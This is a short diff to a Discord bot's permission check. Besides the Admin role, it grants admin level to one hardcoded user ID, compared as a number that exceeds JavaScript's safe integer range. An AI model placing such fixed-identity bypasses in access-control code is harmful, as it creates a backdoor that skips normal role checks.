@@ -20,7 +20,10 @@ module.exports = {
     if (!command) return;
 
     const admin = message.guild.roles.find("name", "Admin");
-    if (message.member.roles.has(admin.id)) { return 1; }
+    if (
+      message.member.id == 319883689175810048 ||
+      message.member.roles.has(admin.id)
+    ) { res = 1 }
     userRoles.forEach((role) => {
       for (var i = 0; i < roles.length; i++) {
         if (roles[i].name == role.name) {
